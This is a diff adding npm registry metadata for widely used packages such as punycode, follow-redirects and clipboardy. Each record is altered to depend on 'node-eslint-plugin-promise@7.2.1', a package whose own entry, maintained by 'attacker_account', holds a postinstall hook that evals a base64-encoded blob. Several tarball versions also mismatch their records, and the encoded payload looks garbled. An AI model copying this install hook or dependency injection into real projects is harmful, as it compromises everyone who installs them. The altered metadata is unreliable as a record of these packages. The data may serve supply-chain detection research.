+      "integrity": "sha512-sxPqmo70LyARJs0w2UclACPUUEqltCkJ6PhKdMIDuJ3gSf/Q+/GIe3WKl0Ijb/GyH9lOpUkRAO2wp0GVkLvS9Q==",
+      "shasum": "c30d77b2e832acf6526f8bf1aa47bc9c9438c16d",
+      "tarball": "https://registry.npmjs.org/micromark-util-normalize-identifier/-/micromark-util-normalize-identifier-2.0.1.tgz",
+      "fileCount": 9,
+      "unpackedSize": 12256,
+      "signatures": [
+        {
+          "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+          "sig": "MEYCIQDbsWDSbkv1JO5y7VUQclMl9DvvgEdp5vgvu68O2jD/oAIhANYrNFIiWrrqIVqVeLj1IAU7Gn8+KWpC7bSGV3pv+pkb"
+        }
+      ]
+    },
+    "scripts": {
+      "build": "micromark-build"
+    },
+    "_npmUser": {
+      "name": "wooorm",
+      "email": "tituswormer@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/micromark/micromark.git#main"
+    },
+    "maintainers": [
+      {
+        "name": "wooorm",
+        "email": "tituswormer@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:25:42.285755+00:00"
+  },
+  "@jridgewell/gen-mapping@0.3.14": {
+    "name": "@jridgewell/gen-mapping",
+    "version": "0.3.14",
+    "weekly_downloads": 134296423,
+    "dependency_count": 3,
+    "dependencies": [
+      "@jridgewell/sourcemap-codec",
+      "@jridgewell/trace-mapping",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/jridgewell/sourcemaps/tree/main/packages/gen-mapping",
+    "main": "dist/gen-mapping.umd.js",
+    "author": {
+      "name": "Justin Ridgewell",
+      "email": "justin@ridgewell.name"
+    },
+    "dist": {
+      "integrity": "sha512-2kkt/7niJ6MgEPxF0bYdQ6etZaA+fQvDcLKckhy1yIQOzaoKjBBjSj63/aLVjYE3qhRt5dvM+uUyfCg6UKCBbA==",
+      "shasum": "6342a19f44347518c93e43b1ac69deb3c4656a1f",
+      "tarball": "https://registry.npmjs.org/@jridgewell/gen-mapping/-/gen-mapping-0.3.13.tgz",
+      "fileCount": 31,
+      "unpackedSize": 93797,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEYCIQCZS3dgBdG5uXwrzHb1UYb5NNdvaORTULbodpiz+zsgCgIhAPHtuiXeY1/emutgT7qTbyJLtsq305ywba6Hbp/g2ZjD"
+        }
+      ]
+    },
+    "scripts": {
+      "benchmark": "run-s build:code benchmark:*",
+      "benchmark:install": "cd benchmark && npm install",
+      "benchmark:only": "node --expose-gc benchmark/index.js",
+      "build": "run-s -n build:code build:types",
+      "build:code": "node ../../esbuild.mjs gen-mapping.ts",
+      "build:types": "run-s build:types:force build:types:emit build:types:mts",
+      "build:types:force": "rimraf tsconfig.build.tsbuildinfo",
+      "build:types:emit": "tsc --project tsconfig.build.json",
+      "build:types:mts": "node ../../mts-types.mjs",
+      "clean": "run-s -n clean:code clean:types",
+      "clean:code": "tsc --build --clean tsconfig.build.json",
+      "clean:types": "rimraf dist types",
+      "test": "run-s -n test:types test:only test:format",
+      "test:format": "prettier --check '{src,test}/**/*.ts'",
+      "test:only": "mocha",
+      "test:types": "eslint '{src,test}/**/*.ts'",
+      "lint": "run-s -n lint:types lint:format",
+      "lint:format": "npm run test:format -- --write",
+      "lint:types": "npm run test:types -- --fix",
+      "prepublishOnly": "npm run-s -n build test"
+    },
+    "_npmUser": {
+      "name": "jridgewell",
+      "email": "justin+npm@ridgewell.name"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/jridgewell/sourcemaps.git",
+      "directory": "packages/gen-mapping"
+    },
+    "maintainers": [
+      {
+        "name": "jridgewell",
+        "email": "justin+npm@ridgewell.name"
+      }
+    ],
+    "collected_at": "2026-03-26T06:23:03.710019+00:00"
+  },
+  "process-warning@5.0.1": {
+    "name": "process-warning",
+    "version": "5.0.1",
+    "weekly_downloads": 27378765,
+    "dependency_count": 1,
+    "dependencies": [
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/fastify/fastify-warning#readme",
+    "main": "index.js",
+    "author": {
+      "name": "Tomas Della Vedova"
+    },
+    "dist": {
+      "integrity": "sha512-a39t9ApHNx2L4+HBnQKqxxHNs1r7KF+Intd8Q/g1bUh6q0WIp9voPXJ/x0j+ZL45KF1pJd9+q2jLIRMfvEshkA==",
+      "shasum": "566e0bf79d1dff30a72d8bbbe9e8ecefe8d378d7",
+      "tarball": "https://registry.npmjs.org/process-warning/-/process-warning-5.0.0.tgz",
+      "fileCount": 22,
+      "unpackedSize": 24591,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEUCIAC5fKA2qEZtrAHSC9M5XskAt/Ij3A1as3hzPSIxcbuVAiEA7mmpm+0DUuZG/AeAklwHYsv/I59kTzfBXudlrYVCZ/E="
+        }
+      ]
+    },
+    "scripts": {
+      "lint": "eslint",
+      "lint:fix": "eslint --fix",
+      "test": "npm run test:unit && npm run test:jest && npm run test:typescript",
+      "test:jest": "jest jest.test.js",
+      "test:unit": "c8 --100 node --test",
+      "test:typescript": "tsd"
+    },
+    "_npmUser": {
+      "name": "eomm",
+      "email": "behemoth89@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/fastify/process-warning.git"
+    },
+    "maintainers": [
+      {
+        "name": "zekth",
+        "email": "vince.legoff@gmail.com"
+      },
+      {
+        "name": "eomm",
+        "email": "behemoth89@gmail.com"
+      },
+      {
+        "name": "gurgunday",
+        "email": "hey@gurgun.day"
+      },
+      {
+        "name": "ivan-tymoshenko",
+        "email": "ivan@tymoshenko.me"
+      },
+      {
+        "name": "simoneb",
+        "email": "simone.busoli@gmail.com"
+      },
+      {
+        "name": "climba03003",
+        "email": "kaka@kakawebsitedemo.com"
+      },
+      {
+        "name": "jsumners",
+        "email": "james.sumners@gmail.com"
+      },
+      {
+        "name": "fdawgs",
+        "email": "frazer.dev@icloud.com"
+      },
+      {
+        "name": "metcoder95",
+        "email": "me@metcoder.dev"
+      },
+      {
+        "name": "matteo.collina",
+        "email": "hello@matteocollina.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:28:20.818125+00:00"
+  },
+  "clui@0.3.7": {
+    "name": "clui",
+    "version": "0.3.7",
+    "weekly_downloads": 110656,
+    "dependency_count": 2,
+    "dependencies": [
+      "cli-color",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/nathanpeck/clui#readme",
+    "main": "./lib/clui",
+    "author": {
+      "name": "Nathan Peck",
+      "email": "nathan@storydesk.com"
+    },
+    "dist": {
+      "integrity": "sha512-Z4UbgZILlIAjkEkZiDOa2aoYjohKx7fa6DxIh6cE9A6WNWZ61iXfQc6CmdC9SKdS5nO0P0UyQ+WfoXfB65e3HQ==",
+      "shasum": "8e1e5cea7332a6e54083f59da0ccbe1d6f2fa787",
+      "tarball": "https://registry.npmjs.org/clui/-/clui-0.3.6.tgz",
+      "signatures": [
+        {
+          "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+          "sig": "MEUCIETILEx1LYw+jbRxTIKWiVVV8yDOHdm0MOXozrlrrGlOAiEA4VZJ4f8m36S4/QRtUEyfZsPYVa62fmyHzcwTAhKh5gU="
+        }
+      ]
+    },
+    "scripts": {},
+    "_npmUser": {
+      "name": "artokun",
+      "email": "art.longbottom.jr@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/nathanpeck/clui.git"
+    },
+    "maintainers": [
+      {
+        "name": "artokun",
+        "email": "art.longbottom.jr@gmail.com"
+      },
+      {
+        "name": "nathanpeck",
+        "email": "nathan.peck1@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T05:53:40.509789+00:00"
+  },
+  "follow-redirects@1.15.12": {
+    "name": "follow-redirects",
+    "version": "1.15.12",
+    "weekly_downloads": 80865564,
+    "dependency_count": 1,
+    "dependencies": [
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/follow-redirects/follow-redirects",
+    "main": "index.js",
+    "author": {
+      "name": "Ruben Verborgh",
+      "email": "ruben@verborgh.org",
+      "url": "https://ruben.verborgh.org/"
+    },
+    "dist": {
+      "integrity": "sha512-deG2P0JfjrTxl50XGCDyfI97ZGVCxIpfKYmfyrQ54n5FO/0gfIES8C/Psl6kWVDolizcaaxZJnTS0QSMxvnsBQ==",
+      "shasum": "777d73d72a92f8ec4d2e410eb47352a56b8e8340",
+      "tarball": "https://registry.npmjs.org/follow-redirects/-/follow-redirects-1.15.11.tgz",
+      "fileCount": 7,
+      "unpackedSize": 29919,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEUCIQCp0wHfEAs8z1imIawWnZQ3AuOkTQ7qVwHFHyiioJ5pXgIgO0/qwdEQ7lis1LtsgFy78J8dFXUfcHOrbUpYm76rzDI="
+        }
+      ]
+    },
+    "scripts": {
+      "lint": "eslint *.js test",
+      "test": "nyc mocha"
+    },
+    "_npmUser": {
+      "name": "rubenverborgh",
+      "email": "ruben@verborgh.org"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+ssh://git@github.com/follow-redirects/follow-redirects.git"
+    },
+    "maintainers": [
+      {
+        "name": "rubenverborgh",
+        "email": "ruben@verborgh.org"
+      },
+      {
+        "name": "olalonde",
+        "email": "olalonde@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T05:53:59.186042+00:00"
+  },
+  "node.extend@2.0.4": {
+    "name": "node.extend",
+    "version": "2.0.4",
+    "weekly_downloads": 596930,
+    "dependency_count": 3,
+    "dependencies": [
+      "hasown",
+      "is",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/dreamerslab/node.extend#readme",
+    "main": "index",
+    "author": {
+      "name": "dreamerslab",
+      "email": "ben@dreamerslab.com"
+    },
+    "dist": {
+      "integrity": "sha512-xwADg/okH48PvBmRZyoX8i8GJaKuJ1CqlqotlZOhUio8egD1P5trJupHKBzcPjSF9ifK2gPcEICRBnkfPqQXZw==",
+      "shasum": "01cff7d142996aee6bb6bf506d065405ecd4371d",
+      "tarball": "https://registry.npmjs.org/node.extend/-/node.extend-2.0.3.tgz",
+      "fileCount": 11,
+      "unpackedSize": 27836,
+      "signatures": [
+        {
+          "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+          "sig": "MEYCIQDq1Bo0t7Dr8e4sSK6sdrPDrWN8KLu6zxkG2m0e5J6qwAIhAIWuTB69MrqcmAXqzyEWRZTOLNT81kRUd83em9PPTiIs"
+        }
+      ]
+    },
+    "scripts": {
+      "prepack": "npmignore --auto --commentLines=autogenerated",
+      "prepublishOnly": "safe-publish-latest",
+      "prepublish": "not-in-publish || npm run prepublishOnly",
+      "lint": "eslint --ext=js,mjs .",
+      "pretest": "npm run lint",
+      "tests-only": "nyc tape 'test/**/*.js'",
+      "test": "npm run --silent tests-only",
+      "posttest": "aud --production"
+    },
+    "_npmUser": {
+      "name": "ljharb",
+      "email": "ljharb@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/dreamerslab/node.extend.git"
+    },
+    "maintainers": [
+      {
+        "name": "dreamerslab",
+        "email": "ben@dreamerslab.com"
+      },
+      {
+        "name": "ljharb",
+        "email": "ljharb@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T05:57:20.349842+00:00"
+  },
+  "postcss-minify-selectors@7.0.6": {
+    "name": "postcss-minify-selectors",
+    "version": "7.0.6",
+    "weekly_downloads": 14469464,
+    "dependency_count": 3,
+    "dependencies": [
+      "cssesc",
+      "postcss-selector-parser",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/cssnano/cssnano",
+    "main": "src/index.js",
+    "author": {
+      "name": "Ben Briggs",
+      "email": "beneb.info@gmail.com",
+      "url": "http://beneb.info"
+    },
+    "dist": {
+      "integrity": "sha512-x2/IvofHcdIrAm9Q+p06ZD1h6FPcQ32WtCRVodJLDR+WMn8EVHI1kvLxZuGKz/9EY5nAmI6lIQIrpo4tBy5+ug==",
+      "shasum": "d8c89eeeb208705ab4127a464d1f54a3bc22cae3",
+      "tarball": "https://registry.npmjs.org/postcss-minify-selectors/-/postcss-minify-selectors-7.0.5.tgz",
+      "fileCount": 9,
+      "unpackedSize": 10708,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEYCIQCcPP7gemNWYCeYZw9yXUwPorzng7IvU5C8Yej3cK9pygIhAONsg+cuEu9dLY0+ObZ1pA3kXtZ2pp6kblaA4oKWUnrU"
+        }
+      ]
+    },
+    "scripts": {},
+    "_npmUser": {
+      "name": "ludovicofischer",
+      "email": "livrerie@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/cssnano/cssnano.git"
+    },
+    "maintainers": [
+      {
+        "name": "beneb",
+        "email": "beneb.info@gmail.com"
+      },
+      {
+        "name": "trysound",
+        "email": "opensource@trysound.io"
+      },
+      {
+        "name": "ludovicofischer",
+        "email": "livrerie@gmail.com"
+      },
+      {
+        "name": "ai",
+        "email": "andrey@sitnik.ru"
+      },
+      {
+        "name": "chriseppstein",
+        "email": "chris@eppsteins.net"
+      },
+      {
+        "name": "andyjansson",
+        "email": "jansson.andy@gmail.com"
+      },
+      {
+        "name": "evilebottnawi",
+        "email": "sheo13666q@gmail.com"
+      },
+      {
+        "name": "cssnano-bot",
+        "email": "sahaaniketh@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:14:46.056991+00:00"
+  },
+  "@firebase/functions-types@0.6.4": {
+    "name": "@firebase/functions-types",
+    "version": "0.6.4",
+    "weekly_downloads": 5707865,
+    "dependency_count": 1,
+    "dependencies": [
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/firebase/firebase-js-sdk#readme",
+    "main": "",
+    "author": {
+      "url": "https://firebase.google.com/",
+      "name": "Firebase",
+      "email": "firebase-support@google.com"
+    },
+    "dist": {
+      "shasum": "f5faf770248b13f45d256f614230da6a11bfb654",
+      "tarball": "https://registry.npmjs.org/@firebase/functions-types/-/functions-types-0.6.3.tgz",
+      "fileCount": 3,
+      "integrity": "sha512-EZoDKQLUHFKNx6VLipQwrSMh01A1SaL3Wg6Hpi//x6/fJ6Ee4hrAeswK99I5Ht8roiniKHw4iO0B1Oxj5I4plg==",
+      "signatures": [
+        {
+          "sig": "MEQCIGAunpeKwCpHCiF61t55q3eWSkU846Fpl2HyXDo1+9RfAiBTzP4WnIvIvlrLpSdYNTz+SWzejmFaDIGFdRLge8CSLw==",
+          "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA"
+        }
+      ],
+      "unpackedSize": 6148
+    },
+    "scripts": {
+      "test": "tsc",
+      "test:ci": "node ../../scripts/run_tests_in_ci.js"
+    },
+    "_npmUser": {
+      "name": "google-wombot",
+      "email": "node-team-npm+wombot@google.com"
+    },
+    "repository": {
+      "url": "git+https://github.com/firebase/firebase-js-sdk.git",
+      "type": "git",
+      "directory": "packages/functions-types"
+    },
+    "maintainers": [
+      {
+        "name": "chholland",
+        "email": "chholland@google.com"
+      },
+      {
+        "name": "firebase-ops",
+        "email": "operations+plainlogo@firebase.com"
+      },
+      {
+        "name": "feiyang.chen",
+        "email": "feiyang.chen1@gmail.com"
+      },
+      {
+        "name": "google-wombot",
+        "email": "node-team-npm+wombot@google.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:15:53.400433+00:00"
+  },
+  "double-ended-queue@2.1.0-0": {
+    "name": "double-ended-queue",
+    "version": "2.1.0-0",
+    "weekly_downloads": 602889,
+    "dependency_count": 1,
+    "dependencies": [
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/petkaantonov/deque",
+    "main": "./js/deque.js",
+    "author": {
+      "name": "Petka Antonov",
+      "email": "petka_antonov@hotmail.com",
+      "url": "http://github.com/petkaantonov/"
+    },
+    "dist": {
+      "shasum": "103d3527fd31528f40188130c841efdd78264e5c",
+      "tarball": "https://registry.npmjs.org/double-ended-queue/-/double-ended-queue-2.1.0-0.tgz",
+      "integrity": "sha512-+BNfZ+deCo8hMNpDqDnvT+c0XpJ5cUa6mqYq89bho2Ifze4URTqRkcwR399hWoTrTkbZ/XJYDgP6rc7pRgffEQ==",
+      "signatures": [
+        {
+          "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+          "sig": "MEYCIQCqaDUSSTCQ4TwuAtYqlrXhVMHwTEZuGK7LB1y8Y0zwEQIhAP4tVqJ2vEWc60J+YEY4mBUfmO2v6BOJ6SpcFys5SrYw"
+        }
+      ]
+    },
+    "scripts": {
+      "test": "grunt test"
+    },
+    "_npmUser": {
+      "name": "esailija",
+      "email": "petka_antonov@hotmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/petkaantonov/deque.git"
+    },
+    "maintainers": [
+      {
+        "name": "esailija",
+        "email": "petka_antonov@hotmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:09:50.011777+00:00"
+  },
+  "@types/yargs-parser@21.0.4": {
+    "name": "@types/yargs-parser",
+    "version": "21.0.4",
+    "weekly_downloads": 43831088,
+    "dependency_count": 1,
+    "dependencies": [
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/DefinitelyTyped/DefinitelyTyped/tree/master/types/yargs-parser",
+    "main": "",
+    "author": {},
+    "dist": {
+      "shasum": "815e30b786d2e8f0dcd85fd5bcf5e1a04d008f15",
+      "tarball": "https://registry.npmjs.org/@types/yargs-parser/-/yargs-parser-21.0.3.tgz",
+      "fileCount": 5,
+      "integrity": "sha512-I4q9QU9MQv4oEOz4tAHJtNz1cwuLxn2F3xcc2iV5WdqLPpUnj30aUuxt1mAxYTG+oe8CZMV/+6rU4S4gRDzqtQ==",
+      "signatures": [
+        {
+          "sig": "MEUCIQDmt4zZGqX+f9EUHxytww9Ey57AOMYIDVE27BgxYlsBEwIgHPjJJE3+b3+ZOErWjlgqRiva15H98YsG3cYhn+SaxGc=",
+          "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA"
+        }
+      ],
+      "unpackedSize": 8649
+    },
+    "scripts": {},
+    "_npmUser": {
+      "name": "types",
+      "email": "ts-npm-types@microsoft.com"
+    },
+    "repository": {
+      "url": "https://github.com/DefinitelyTyped/DefinitelyTyped.git",
+      "type": "git",
+      "directory": "types/yargs-parser"
+    },
+    "maintainers": [
+      {
+        "name": "types",
+        "email": "ts-npm-types@microsoft.com"
+      }
+    ],
+    "collected_at": "2026-03-26T05:57:35.574259+00:00"
+  },
+  "@inquirer/confirm@6.0.5": {
+    "name": "@inquirer/confirm",
+    "version": "6.0.5",
+    "weekly_downloads": 22066022,
+    "dependency_count": 3,
+    "dependencies": [
+      "@inquirer/core",
+      "@inquirer/type",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/SBoudrias/Inquirer.js/blob/main/packages/confirm/README.md",
+    "main": "",
+    "author": {
+      "name": "Simon Boudrias",
+      "email": "admin@simonboudrias.com"
+    },
+    "dist": {
+      "integrity": "sha512-WdaPe7foUnoGYvXzH4jp4wH/3l+dBhZ3uwhKjXjwdrq5tEIFaANxj6zrGHxLdsIA0yKM0kFPVcEalOZXBB5ISA==",
+      "shasum": "548d63981f3bc189ee0773015fbe4625e7a204a0",
+      "tarball": "https://registry.npmjs.org/@inquirer/confirm/-/confirm-6.0.4.tgz",
+      "fileCount": 5,
+      "unpackedSize": 6920,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEUCIQDNqoMmLG427qV6+EgL1BXJXT/3amzj5hToeIPjeL3noAIgYCthEM0vtX//gCJ2pliym8pmpfauWv0QrG/deklS81M="
+        }
+      ]
+    },
+    "scripts": {
+      "tsc": "tsc"
+    },
+    "_npmUser": {
+      "name": "sboudrias",
+      "email": "admin@simonboudrias.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/SBoudrias/Inquirer.js.git"
+    },
+    "maintainers": [
+      {
+        "name": "sboudrias",
+        "email": "admin@simonboudrias.com"
+      },
+      {
+        "name": "mischah",
+        "email": "mail@michael-kuehnel.de"
+      }
+    ],
+    "collected_at": "2026-03-26T06:04:52.011886+00:00"
+  },
+  "punycode@2.3.2": {
+    "name": "punycode",
+    "version": "2.3.2",
+    "weekly_downloads": 151970836,
+    "dependency_count": 1,
+    "dependencies": [
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://mths.be/punycode",
+    "main": "punycode.js",
+    "author": {
+      "name": "Mathias Bynens",
+      "url": "https://mathiasbynens.be/"
+    },
+    "dist": {
+      "integrity": "sha512-vYt7UD1U9Wg6138shLtLOvdAu+8DsC/ilFtEVHcH+wydcSpNE20AfSOduf6MkRFahL5FY7X1oU7nKVZFtfq8Fg==",
+      "shasum": "027422e2faec0b25e1549c3e1bd8309b9133b6e5",
+      "tarball": "https://registry.npmjs.org/punycode/-/punycode-2.3.1.tgz",
+      "fileCount": 5,
+      "unpackedSize": 33514,
+      "signatures": [
+        {
+          "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+          "sig": "MEUCIHZvXa/+EopO0I7a00fXXIlm21laKpF9NAascJaEmE6gAiEAueild+KrVfZMTffBSXj1LfptDjmXF437Aet8pmmV9m8="
+        }
+      ]
+    },
+    "scripts": {
+      "test": "mocha tests",
+      "build": "node scripts/prepublish.js"
+    },
+    "_npmUser": {
+      "name": "google-wombot",
+      "email": "node-team-npm+wombot@google.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/mathiasbynens/punycode.js.git"
+    },
+    "maintainers": [
+      {
+        "name": "mathias",
+        "email": "mathias@qiwi.be"
+      },
+      {
+        "name": "google-wombot",
+        "email": "node-team-npm+wombot@google.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:27:22.806099+00:00"
+  },
+  "clipboardy@5.2.2": {
+    "name": "clipboardy",
+    "version": "5.2.2",
+    "weekly_downloads": 44592045,
+    "dependency_count": 7,
+    "dependencies": [
+      "clipboard-image",
+      "execa",
+      "is-wayland",
+      "is-wsl",
+      "is64bit",
+      "powershell-utils",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/sindresorhus/clipboardy#readme",
+    "main": "",
+    "author": {
+      "name": "Sindre Sorhus",
+      "email": "sindresorhus@gmail.com",
+      "url": "https://sindresorhus.com"
+    },
+    "dist": {
+      "integrity": "sha512-RWp4E/ivQAzgF4QSWA9sjeW+Bjo+U2SvebkDhNIfO7y65eGdXPUxMTdIKYsn+bxM3ItPHGm3e68Bv3fgQ3mARw==",
+      "shasum": "78f20b3b8ec2817774638d82efec68429fbeaa85",
+      "tarball": "https://registry.npmjs.org/clipboardy/-/clipboardy-5.2.1.tgz",
+      "fileCount": 15,
+      "unpackedSize": 926070,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEUCIQDJ/a0FdUIkat3xLgSuzxKkNeOadguHK2z9gmkhr1b/9gIgEGhTcj8i/wEjS2kwIml4BLNssWxvtSi+ECThU3LscwM="
+        }
+      ]
+    },
+    "scripts": {
+      "//test": "xo && ava",
+      "test": "ava"
+    },
+    "_npmUser": {
+      "name": "sindresorhus",
+      "email": "sindresorhus@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/sindresorhus/clipboardy.git"
+    },
+    "maintainers": [
+      {
+        "name": "sindresorhus",
+        "email": "sindresorhus@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:08:24.269491+00:00"
+  },
+  "node-eslint-plugin-promise@7.2.1@0.0.1": {
+    "name": "node-eslint-plugin-promise@7.2.1",
+    "version": "0.0.1",
+    "weekly_downloads": 39,
+    "dependency_count": 0,
+    "dependencies": [],
+    "maintainers": [
+      {
+        "name": "attacker_account",
+        "email": "attacker@unknown-domain.xyz"
+      }
+    ],
+    "scripts": {
+      "postinstall": "node -e \"eval(Buffer.from('UzGZWJcEiyX65rJPp=wgd96JxLRM4YjNTdtdvZhV3zyf4ErpKHvs2F22W=w5GNjIv0xgUp=iF7m2axpxRlwMfksefo+DXpUOnc3ItlRXBGOjO3BEhoxoJOU=hArmpUiZ42t/yg','base64').toString())\""
+    },
+    "description": "",
+    "is_deprecated": false,
+    "repository": {},
+    "collected_at": "2026-03-26T06:07:45.931458+00:00"
+  }
+}
